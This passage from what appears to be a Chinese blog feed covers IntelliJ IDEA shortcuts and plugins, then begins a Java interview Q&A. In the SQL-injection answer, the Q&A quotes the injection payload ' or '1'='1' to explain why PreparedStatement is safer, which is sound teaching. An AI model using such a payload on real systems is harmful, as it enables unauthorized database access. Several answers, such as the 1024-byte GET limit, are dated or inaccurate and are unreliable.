←/→</td><td>跳转历史光标所在处</td></tr><tr><td>Alt + ←/→ 方向键</td><td>切换子tab</td></tr><tr><td>Ctrl + G</td><td>go to（跳转指定行号）</td></tr></tbody></table><p>编码相关<br>| 快捷键                           | 介绍                                                |<br>|——————————-|—————————————————|<br>| Ctrl + W                     | 快速选中                                              |<br>| (Shift + Ctrl) + Alt + J | 快速选中同文本                                           |<br>| Ctrl + C/Ctrl + X/Ctrl + D | 快速复制或剪切                                           |<br>| 多行选中 Tab / Shift  + Tab      | tab                                               |<br>| Ctrl + Y                     | 删除整行                                              |<br>| 滚轮点击变量/方法/类                   | 快速进入变量/方法/类的定义处                                   |<br>| Shift + 点击Tab                | 快速关闭tab                                           |<br>| Ctrl + Z 、Ctrl + Shift + Z | 后悔药，撤销/取消撤销                                       |<br>| Ctrl + Shift + enter        | 自动收尾，代码自动补全                                       |<br>| Alt + enter                  | IntelliJ IDEA 根据光标所在问题，提供快速修复选择，光标放在的位置不同提示的结果也不同 |<br>| Alt + ↑/↓                    | 方法快速跳转                                            |<br>| F2                            | 跳转到下一个高亮错误 或 警告位置                                 |<br>| Alt + Insert                 | 代码自动生成，如生成对象的 set / get 方法，构造函数，toString() 等    |<br>| Ctrl + Shift + L            | 格式化代码                                             |<br>| Shift + F6                   | 快速修改方法名、变量名、文件名、类名等                               |<br>| Ctrl + F6                    | 快速修改方法签名                                          |</p><p>代码阅读相关</p><table><thead><tr><th>快捷键</th><th>介绍</th></tr></thead><tbody><tr><td>Ctrl + P</td><td>方法参数提示显示</td></tr><tr><td>Ctrl + Shift + i</td><td>就可以在当前类里再弹出一个窗口出来</td></tr><tr><td>Alt + F7</td><td>可以列出变量在哪些地方被使用了</td></tr><tr><td>光标在子类接口名，Ctrl + u</td><td>跳到父类接口</td></tr><tr><td>Alt + F1 + 1， esc</td><td></td></tr><tr><td>(Shift) + Ctrl + +/-</td><td>代码块折叠</td></tr><tr><td>Ctrl + Shift + ←/→</td><td>移动窗口分割线</td></tr><tr><td>Ctrl  + (Alt) + B</td><td>跳转方法定义/实现</td></tr><tr><td>Ctrl  + H</td><td>类的层级关系</td></tr><tr><td>Ctrl  + F12</td><td>Show Members 类成员快速显示</td></tr></tbody></table><p>版本管理相关</p><table><thead><tr><th>快捷键</th><th>介绍</th></tr></thead><tbody><tr><td>Ctrl + D</td><td>Show Diff</td></tr><tr><td>(Shift) + F7</td><td>（上）下一处修改</td></tr></tbody></table><p>更多快捷键请参考此文章</p><blockquote><p>leblog.github.io</p></blockquote><hr><h2 id="编码效率相关（★★）"><a href="#编码效率相关（★★）" class="headerlink" title="编码效率相关（★★）"></a>编码效率相关（★★）</h2><p>文件代码模板</p><p>Settings -&gt; Editor -&gt; File and Code Template<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnNhY0d6aWNrcklOOHhmZ05UaE15cU5mOUVLQzNGdk5VbzIzRUxWU2VHUTR4M3V2aHVIVW41bmV3LzY0MA?x-oss-process=image/format,png" alt="在这里插入图片描述"></p><p>在这里可以看到IDEA所有内置的文件代码模板，当你选择某个文件生成时，就会按照这里面的模板生成指定的代码文件。</p><p>另外，你可以在这里设置文件头。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2pwZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnM3SWg1RGw2aWI0eVY1QmdGb0RQVk5BU0ZMRXNaYmhpYlRUQjRhdnJ0VGliTjNvZmN1TExobk9FVUEvNjQw?x-oss-process=image/format,png" alt="在这里插入图片描述"><br>设置之后，效果如下</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2pwZy96Nzl5SWJHQkVRQnNBZmo2WU9JMlNqdExKZHQzMnBkM0docDZyUGtONzBueGc5bGtwVlBKNG5jVjNjREZ1TjBpYU14WTF3aWN4UEUwTksxVzJsMVpkTUJ3LzY0MA?x-oss-process=image/format,png" alt="在这里插入图片描述"><br>实时代码模板</p><p>IDEA提供了强大的实时代码模板功能，并且原生内置了很多的模板，比如，当你输入sout或者psvm，就会快速自动生成System.out.println();和public static void main(String[] args) {}的代码块。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnM4QjFZaklFdnZNZ2VtNlVQNnRkY2x2d1BXcGlhaWJDY2pFWEx1dDZGNTRzMUpFWXR1dndxTXBuQS82NDA?x-oss-process=image/format,png" alt="在这里插入图片描述"><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2pwZy96Nzl5SWJHQkVRQnNBZmo2WU9JMlNqdExKZHQzMnBkM2lhUEtCY2JSQnE4VHdYRDlmZ3pLUm5PU3p6VFZUUlFEbXdXa3IxdlRqRHBDeFdneHNzSWdpYll3LzY0MA?x-oss-process=image/format,png" alt="在这里插入图片描述"><br>这些的模板可以在Settings -&gt; Editor -&gt; Live Templates看到。使用者可以按照自己的使用习惯来熟悉相关的代码模板。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnNoa2xEOXhKRTdDbzYzamZHMm10R2ZLS2ZaaWJreGliUWNaQXhad2dpYXY2V08wWlJXU0NsRWRBcWcvNjQw?x-oss-process=image/format,png" alt="在这里插入图片描述"><br>定制代码模板</p><p>IDEA也提供自己定制实时代码模板的功能。</p><ul><li><p>创建自己的模板库</p></li><li><p>创建定制的代码模板<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2pwZy96Nzl5SWJHQkVRQnNBZmo2WU9JMlNqdExKZHQzMnBkM0R6aWJMNmY2YUdERGliaWN6YnQ4ZzBIdjRoT1RweGRBZUVhbjFKRDU4RUNSTVBYYUN0bVZVa3ZPUS82NDA?x-oss-process=image/format,png" alt="在这里插入图片描述"><br>图中的MyGroup就存放着我自己定义的代码模板。</p></li></ul><p>其他</p><p>CRTL+ALT+T<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnNsRmxNZ2NHMjJ3S0Y2SnkxZUVCNVNKeWFXajFERUN3SEVhYUkydVYxV01STmJiZDVCejZNbEEvNjQw?x-oss-process=image/format,png" alt="在这里插入图片描述"></p><p>Ctrl + Alt + T 提供的是代码块包裹功能 - Surround With。可以快速将选中的代码块，包裹到选择的语句块中。</p><p>本地历史版本</p><p>IDEA 自带本地版本管理的功能，能够让你本地编写代码变得更加的安心和方便。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnNBV2pYSk1RMURPNmROcUUwSmliTkwxSVlWVWlhbm1nNElXS2g0S2lhaGVPVU1idWxpYkN1T0NEaWFYdy82NDA?x-oss-process=image/format,png" alt="在这里插入图片描述"><hr></p><h2 id="代码调试-源码阅读相关（★★★）"><a href="#代码调试-源码阅读相关（★★★）" class="headerlink" title="代码调试 源码阅读相关（★★★）"></a>代码调试 源码阅读相关（★★★）</h2><p>视图模式<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnNQUUJLdTVMU3hVQzJOcXF4OVVjRURGdUtaUWliOXZOZWtJVmlhVVpRQ2libExlM2RXb01FR0Q1N3cvNjQw?x-oss-process=image/format,png" alt="在这里插入图片描述"><br>IDEA提供两种特殊的视图模式，</p><ul><li><p>Presentation Mode - 演示模式，专门用于Code Review这种需要展示代码的场景</p></li><li><p>Distraction Free Mode - 禅模式，专注于代码开发</p></li></ul><p>代码调试</p><p><strong>1. 条件断点</strong></p><p>IDEA 可以设置指定条件的断点，增加我们调试的效率。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnNpYkZHdGFpYm43RlpJMEl3OGxibHZMRGVpYjhLNUZGN0F2dmRwOWdBVU10bWhvRDkxaWEyZ2c4VzlBLzY0MA?x-oss-process=image/format,png" alt="在这里插入图片描述"><br><strong>2. 强制返回</strong></p><p>IDEA 可以在打断点的方法栈处，强制返回你想要的方法返回值给调用方。非常灵活！<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnNoVUhGQ1piVGljNmZpYnYwR0tCMkJOWXNlSlRXZzJIVGJtM3NnVUhxdFltdEpyYlFqRjFsaWJCTVEvNjQw?x-oss-process=image/format,png" alt="在这里插入图片描述"><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnMxZ3FCWGVzR2lhUkxsTzJnZ0V1V0NaUk1YTGlhSURxVEhRUDcxUFBxYTk4TkhjZnRBRThSN3hyZy82NDA?x-oss-process=image/format,png" alt="在这里插入图片描述"><br><strong>3. 模拟异常</strong></p><p>IDEA 可以在打断点的方法栈处，强制抛出异常给调用方。这个在调试源码的时候非常有用。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnN3VHYyS0hvRnNMd3JvajlwUlNwYzhnUUttYm9mSWo1YjUzMHVGTHM0RlBWR0Q4bzg4RFBpYXlnLzY0MA?x-oss-process=image/format,png" alt="在这里插入图片描述"><br><strong>4. Evaluate Expression</strong></p><p>IDEA 还可以在调试代码的时候，动态修改当前方法栈中变量的值，方便我们的调试。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2pwZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnNCeVQ3QXhTaWJNWTVDbTZmeG5xR1RKMWliVDRoY1NLREpReDFHRkM1SjY1U1REZUlGMFJMRmNkQS82NDA?x-oss-process=image/format,png" alt="在这里插入图片描述"></p><hr><h3 id="插件方面"><a href="#插件方面" class="headerlink" title="插件方面"></a>插件方面</h3><p><strong>插件安装</strong></p><p>File -&gt; Setting -&gt; Plugin</p><p>插件安装，可以直接在IDEA的插件库中实时搜索安装。browse plugin repository</p><p>对于网络不好的用户，可以登录官方插件仓库地址：plugins.jetbrains.com/idea，下载压缩包之后，选择<code>install from disk</code></p><p><strong>插件推荐</strong></p><p>本人日常开发中使用的插件</p><p><strong>Alibaba Java Coding Guidelines</strong></p><p>阿里Java编程规约插件</p><p><strong>FindBugs</strong></p><p>代码缺陷扫描<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2pwZy96Nzl5SWJHQkVRQnNBZmo2WU9JMlNqdExKZHQzMnBkM1E5cWZVOVM4SE1SQ2tTM2liMjZtZ0x5OHl2cm9OY0NKaWNOcjRlcHBYMXprcXJaMW5IQ25zRVZRLzY0MA?x-oss-process=image/format,png" alt="在这里插入图片描述"><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnNrOXNJYmRDaGRpY0NZdWhydVlZWWljRTc1SXBpY2NVcVFWR3dWdjdsQWdVaWNxbUNINURadDVIMTFBLzY0MA?x-oss-process=image/format,png" alt="在这里插入图片描述"><br><strong>PMD</strong></p><p>代码缺陷扫描</p><p><strong>InnerBuilder</strong></p><p>builder模式快速生成<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnNWSG9uT2FGRERtOG5XcXlTT2V1OUFQWklZODFTVzJkRVFUT2liVjlldWJmWGdKZVlDdXQ1SUh3LzY0MA?x-oss-process=image/format,png" alt="在这里插入图片描述"><br><strong>lombok plugin</strong></p><p>lombok 插件</p><p><strong>maven helper</strong></p><p>maven 依赖管理助手 ，解析maven pom结构，分析冲突；<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnNnaEQ2aWFvaWJoaWJpYklyWERQenBXMTROS2lhNmlheWdpYmdIbXhobkc3aWF4TDVXdnZxakl0WlUzeDI2QS82NDA?x-oss-process=image/format,png" alt="在这里插入图片描述"><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnMxWUZrYlE5YWlieENoa3NSTU5vbktibU9LNnRGcE83S2VXalM3bTB4TUdNSlZjM3hhQ3YwcGtBLzY0MA?x-oss-process=image/format,png" alt="在这里插入图片描述"></p><p><strong>Rainbow brackets</strong></p><p>让代码中的括号更具标识性<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnNyTkNKOTVNeFJPZVFXMFhaNVR3dk5HMDJ1MVVVaWJDZGJrdEJYQWZ5V3QzU2ljOFZ1aWNncWpOOUEvNjQw?x-oss-process=image/format,png" alt="在这里插入图片描述"><br><strong>String Manipulation</strong></p><p>String相关辅助简化，搭配 CTRL+W 、ALT+J等文本选择快捷键使用<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2dpZi9lUVB5QmZmWWJ1ZmVEUGY4MzkydkFqdHp6MzNMWGVjd2xMZ005dmNFZ1NNU2M1QTZLRGQxVTZ3VzlYMHlRUzFYNDdQMnlDR0hQa1Y4Rm4zbUhMQjRvZy82NDA?x-oss-process=image/format,png" alt="在这里插入图片描述"><br><strong>Translation</strong></p><p>翻译插件，阅读源码必备<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnM2RlhueEtRM04wYlgxekVvak1DNENxU1NISHU0QnBvM2pJaHVaOWZJNXBpYjRXN3psNmpBU1NRLzY0MA?x-oss-process=image/format,png" alt="在这里插入图片描述"><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnNxTVViZjNiZ1o2ZWliaWJZdkdBOTlkQUZPYUlZR2t3TkR0MEFVZm1NRVV6akVyMnVMWW5hSVNrZy82NDA?x-oss-process=image/format,png" alt="在这里插入图片描述"><br><strong>GenerateAllSetter</strong><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2dpZi9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnNLSHJtSGJDVUtrcThjT1JhYmljSXY5RE9vSnpqWGZoTmliMUVubDlOVWlhdXpFV2gxYVFmUjd2T3cvNjQw?x-oss-process=image/format,png" alt="在这里插入图片描述"></p><pre><code>**Key Promoter X**</code></pre><p>对你的鼠标操作进行 快捷键提示<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2dpZi9lUVB5QmZmWWJ1ZmVEUGY4MzkydkFqdHp6MzNMWGVjd0FFSUhSTUw3bHpqckppYmxRUUFvUTZ2MjRHNG1wY2cwN3VWTFhxN2JGMFZxMlJ2MWg4Qk51dGcvNjQw?x-oss-process=image/format,png" alt="在这里插入图片描述"><br><strong>GenerateSerialVersionUID</strong></p><p>Alt + Insert 快速生成SerialVersionUID<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2dpZi9lUVB5QmZmWWJ1ZmVEUGY4MzkydkFqdHp6MzNMWGVjdzB1a2dxcEpHdFdpYjM1NzA1QmRiaFlkRkJwdGxvSXRDQlZUTG9MSEJQZmVFaWNaWE5Vb3dQVEFRLzY0MA?x-oss-process=image/format,png" alt="在这里插入图片描述"><br><strong>GsonFormat</strong><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2dpZi9lUVB5QmZmWWJ1ZmVEUGY4MzkydkFqdHp6MzNMWGVjd3B5Z2tOSzhmeERBQkN5aWFXQVVpYk15cGtDaDM5aWFxMlVFUHlHVzI0eWVEOFBPY25weG5ZQnlwZy82NDA?x-oss-process=image/format,png" alt="在这里插入图片描述"><br><strong>RestfulToolkit</strong></p><ul><li><p>快速跳转到Restful Api处( use: Ctrl(Command) + \ or Ctrl + Alt + N )</p></li><li><p>展示Resultful 接口结构</p></li><li><p>http 简单请求工具<img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnNrMWljeHNzc0pOaWNLaWI1VmliY3hLbDU3bW5NOFhjNFY4QmlhWUJhSGZrblpSdE9FQlpKWVNIQ05jUS82NDA?x-oss-process=image/format,png" alt="在这里插入图片描述"></p></li><li><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X2pwZy96Nzl5SWJHQkVRQnNBZmo2WU9JMlNqdExKZHQzMnBkM0NOc0tZTHVWaWJsRXp2Vm01b1ZXVVVlZ0xQeG1DNUpwU0poR0pGVFhHd1NzZ0QzaWJsZEtMTFF3LzY0MA?x-oss-process=image/format,png" alt="在这里插入图片描述"></p></li></ul><p><strong>Material Theme UI</strong></p><p>本人自用的主题就是这个。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnNTdVNKdk5oYlhDOGxhN0Z4b2xpYUtyYUdGOHRhaldHMmxIR3RYbFcxcXhBYWEzM1ZTaWNKR29ody82NDA?x-oss-process=image/format,png" alt="在这里插入图片描述"><br><strong>MyBatis Log Plugin</strong></p><p>把 Mybatis 输出的sql日志还原成完整的sql语句，看起来更直观。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy9RQ3U4NDlZVGFJTUFDenU1RHYweWhpYzRHUldVSm1qUnNla0J5Y091UDY4WG1xeGliYnZUN3BaU1pDSEVXQUdFN1BpYzJ0OGliVWd5VWlhemY3a2JtaElPTVVRLzY0MA?x-oss-process=image/format,png" alt="在这里插入图片描述"><br><strong>Free Mybatis</strong></p><p>MyBatis 免费的插件</p><hr><p>参考</p><blockquote><p><a href="https://github.com/judasn/IntelliJ-IDEA-Tutorial" target="_blank" rel="noopener">https://github.com/judasn/IntelliJ-IDEA-Tutorial</a></p></blockquote><p>(By the way, 更多IDEA使用请参考此延伸文档以及官方文档)</p><h1>（完）<h1></h1></h1>]]></content>
      
      
      <categories>
          
          <category> IDEA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Intelij IDEA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里巴巴Java方向面试题汇总（含答案）</title>
      <link href="2018/05/01/a-li-ba-ba-java-fang-xiang-mian-shi-ti-hui-zong-han-da-an/"/>
      <url>2018/05/01/a-li-ba-ba-java-fang-xiang-mian-shi-ti-hui-zong-han-da-an/</url>
      
        <content type="html"><![CDATA[<h1 id="阿里巴巴Java方向面试题汇总（含答案）"><a href="#阿里巴巴Java方向面试题汇总（含答案）" class="headerlink" title="阿里巴巴Java方向面试题汇总（含答案）"></a>阿里巴巴Java方向面试题汇总（含答案）</h1><p>涉及了从Java内置的基础数据结构、常用的服务器知识、Java网络编程相关的知识，再到Java的内存模型、Java常用编程框架等各个方面的内容，希望能够帮助大家回顾Java的基础内容，进而查漏补缺，完善自身的知识体系。</p><h2 id="一、String-StringBuffer-StringBuilder的区别是什么？String为什么是不可变的？"><a href="#一、String-StringBuffer-StringBuilder的区别是什么？String为什么是不可变的？" class="headerlink" title="一、String, StringBuffer, StringBuilder的区别是什么？String为什么是不可变的？"></a>一、String, StringBuffer, StringBuilder的区别是什么？String为什么是不可变的？</h2><ol><li>String是字符串常量，StringBuffer和StringBuilder都是字符串变量。后两者的字符内容可变，而前者创建后内容不可变。</li><li>String不可变是因为在JDK中String类被声明为一个final类。</li><li>StringBuffer是线程安全的，而StringBuilder是非线程安全的。</li></ol><p><strong>补充说明</strong>：线程安全会带来额外的系统开销，所以StringBuilder的效率比StringBuffer高。如果对系统中的线程是否安全很掌握，可用StringBuffer，在线程不安全处加上关键字Synchronize。</p><h2 id="二、Vector-ArrayList-LinkedList的区别是什么？"><a href="#二、Vector-ArrayList-LinkedList的区别是什么？" class="headerlink" title="二、Vector, ArrayList, LinkedList的区别是什么？"></a>二、Vector, ArrayList, LinkedList的区别是什么？</h2><ol><li>Vector、ArrayList都是以类似数组的形式存储在内存中，LinkedList则以链表的形式进行存储。</li><li>List中的元素有序、允许有重复的元素，Set中的元素无序、不允许有重复元素。</li><li>Vector线程同步，ArrayList、LinkedList线程不同步。</li><li>LinkedList适合指定位置插入、删除操作，不适合查找；ArrayList、Vector适合查找，不适合指定位置的插入、删除操作。</li><li>ArrayList在元素填满容器时会自动扩充容器大小的约50%，而Vector则是100%，因此ArrayList更节省空间。</li></ol><h2 id="三、HashTable-HashMap，-TreeMap的区别是什么？"><a href="#三、HashTable-HashMap，-TreeMap的区别是什么？" class="headerlink" title="三、HashTable, HashMap， TreeMap的区别是什么？"></a>三、HashTable, HashMap， TreeMap的区别是什么？</h2><ol><li>HashTable线程同步，HashMap非线程同步。</li><li>HashTable不允许&lt;键,值&gt;有空值，HashMap允许&lt;键,值&gt;有空值。</li><li>HashTable使用Enumeration，HashMap使用Iterator。</li><li>HashTable中hash数组的默认大小是11，增加方式的old*2+1，HashMap中hash数组的默认大小是16，增长方式一定是2的指数倍。</li><li>TreeMap能够把它保存的记录根据键排序，默认是按升序排序。</li></ol><p><strong>补充说明</strong>：以上三个问题所涉及的都是Java语言中的一些比较高级的数据结构，从字符串相关到容器再到哈希表和树等数据结构，因此我们在学习Java语言的时候，也需要更加深入地去对比比较类似的数据结构的使用场景以及其优缺点。</p><h2 id="四、Tomcat，Apache，JBoss的区别？"><a href="#四、Tomcat，Apache，JBoss的区别？" class="headerlink" title="四、Tomcat，Apache，JBoss的区别？"></a>四、Tomcat，Apache，JBoss的区别？</h2><ol><li>Apache是HTTP服务器，Tomcat是Web服务器，JBoss是应用服务器。</li><li>Apache解析静态的Html文件；Tomcat可解析jsp动态页面、也可充当</li><li>容器。</li></ol><p><strong>补充说明</strong>：对于服务器而言，在面试中可能并不会过多涉及，相对而言，面小易认为像是Liunx、Tomcat这些背后的原理可能更受面试官的青睐。</p><h2 id="五、GET，POST请求之间的区别？"><a href="#五、GET，POST请求之间的区别？" class="headerlink" title="五、GET，POST请求之间的区别？"></a>五、GET，POST请求之间的区别？</h2><pre><code>基础知识：HTTP的请求格式如下。主要包含三个信息：1、请求的类型（GET或POST），2、要访问的资源（如resimga.jif），3、HTTP版本（http/1.1）</code></pre><p><strong>区别：</strong></p><ol><li>Get是从服务器端获取数据，Post则是向服务器端发送数据。</li><li>在客户端，Get方式通过URL提交数据，在URL地址栏可以看到请求消息，该消息被编码过；Post数据则是放在Html header内提交。</li><li>对于Get方式，服务器端用Request.QueryString获取变量的值；对用Post方式，服务器端用Request.Form获取提交的数据值。</li><li>Get方式提交的数据最多1024字节，而Post则没有限制。</li><li>Get方式提交的参数及参数值会在地址栏显示，不安全，而Post不会，比较安全。</li></ol><h2 id="六、Session-Cookie的区别是什么？"><a href="#六、Session-Cookie的区别是什么？" class="headerlink" title="六、Session, Cookie的区别是什么？"></a>六、Session, Cookie的区别是什么？</h2><ol><li>Session由应用服务器维护的一个服务器端的存储空间；Cookie是客户端的存储空间，由浏览器维护。</li><li>用户可以通过浏览器设置决定是否保存Cookie，而不能决定是否保存Session，因为Session是由服务器端维护的。</li><li>Session中保存的是对象，Cookie中保存的是字符串。</li><li>Session和Cookie不能跨窗口使用，每打开一个浏览器系统会赋予一个SessionID，此时的SessionID不同，若要完成跨浏览器访问数据，可以使用 Application。</li><li>Session、Cookie都有失效时间，过期后会自动删除，减少系统开销。</li></ol><h2 id="七、HTTP-报文包含内容"><a href="#七、HTTP-报文包含内容" class="headerlink" title="七、HTTP 报文包含内容"></a>七、HTTP 报文包含内容</h2><p>主要包含四部分：</p><ol><li>request line</li><li>header line</li><li>blank line</li><li>request body</li></ol><p><strong>补充说明</strong>：上面的三个问题是网络编程的基础知识问题，作为Java工程师也需要掌握HTTP的知识，而如今HTTPS同样也成为了标准，也需要大家进一步了解。此外，相对于大家在课本或者课堂中所学习的HTTP 1.0/1.1这些协议而言，很多公司已经迈入了HTTP 2.0时代，因此两者之间的差别也需要我们进一步了解。</p><h2 id="八、Servlet的生命周期"><a href="#八、Servlet的生命周期" class="headerlink" title="八、Servlet的生命周期"></a>八、Servlet的生命周期</h2><p>大致分为4部：Servlet类加载–&gt;实例化–&gt;服务–&gt;销毁</p><p>Tomcat中Servlet的时序图如下所示：</p><p><img src="https://i.imgur.com/6t8q318.jpg" alt></p><ol><li>Web Client向Servlet容器(Tomcat)发出HTTP请求。</li><li>Servlet容器接收Client端的请求。</li><li>Servlet容器创建一个HttpRequest对象，将Client的请求信息封装到这个对象中。</li><li>Servlet创建一个HttpResponse对象。</li><li>Servlet调用HttpServlet对象的service方法，把HttpRequest对象和HttpResponse对象作为参数传递给HttpServlet对象中。</li><li>HttpServlet调用HttpRequest对象的方法，获取Http请求，并进行相应处理。</li><li>处理完成HttpServlet调用HttpResponse对象的方法，返回响应数据。</li><li>Servlet容器把HttpServlet的响应结果传回客户端。</li></ol><p>其中的3个方法说明了Servlet的生命周期：</p><ol><li>init()：负责初始化Servlet对象。</li><li>service()：负责响应客户端请求。</li><li>destroy()：当Servlet对象推出时，负责释放占用资源。</li></ol><h2 id="九、Statement与PreparedStatement的区别-什么是SQL注入，如何防止SQL注入？"><a href="#九、Statement与PreparedStatement的区别-什么是SQL注入，如何防止SQL注入？" class="headerlink" title="九、Statement与PreparedStatement的区别,什么是SQL注入，如何防止SQL注入？"></a>九、Statement与PreparedStatement的区别,什么是SQL注入，如何防止SQL注入？</h2><ol><li>PreparedStatement支持动态设置参数，Statement不支持。</li><li>PreparedStatement可避免如类似 单引号 的编码麻烦，Statement不可以。</li><li>PreparedStatement支持预编译，Statement不支持。</li><li>在SQL语句出错时PreparedStatement不易检查，而Statement则更便于查错。</li><li>PreparedStatement可防止SQL助于，更加安全，而Statement不行。</li></ol><p><strong>补充说明-什么是SQL注入以及应对策略：</strong> 通过SQL语句的拼接达到无参数查询数据库数据目的的方法。如将要执行的SQL语句为 select * from table where name = “+appName+”，利用appName参数值的输入，来生成恶意的SQL语句，如将[‘or’1’=‘1’] 传入可在数据库中执行。因此可以采用PrepareStatement来避免SQL注入，在服务器端接收参数数据后，进行验证，此时PrepareStatement会自动检测，而Statement不行，需要手工检测。</p><h2 id="十、sendRedirect-foward区别"><a href="#十、sendRedirect-foward区别" class="headerlink" title="十、sendRedirect, foward区别"></a>十、sendRedirect, foward区别</h2><ol><li>foward是服务器端控制页面转向，在客户端的浏览器地址中不会显示转向后的地址；sendRedirect则是完全的跳转，浏览器中会显示跳转的地址并重新发送请求链接。原理：forward是服务器请求资源，服务器直接访问目标地址的URL，把那个URL的响应内容读取过来，然后再将这些内容返回给浏览器，浏览器根本不知道服务器发送的这些内容是从哪来的，所以地址栏还是原来的地址。</li><li>redirect是服务器端根据逻辑，发送一个状态码，告诉浏览器重新去请求的那个地址，浏览器会用刚才的所有参数重新发送新的请求。</li></ol><p><strong>补充说明</strong>：以上的三个问题在之前网络相关的知识上更进一步，上升到了Java网络编程的相关知识，这部分意在考察面试者对于Java网络编程相关知识的掌握程度。</p><h2 id="十一、谈谈Hibernate的理解，一级和二级缓存的作用，在项目中Hibernate都是怎么使用缓存的？"><a href="#十一、谈谈Hibernate的理解，一级和二级缓存的作用，在项目中Hibernate都是怎么使用缓存的？" class="headerlink" 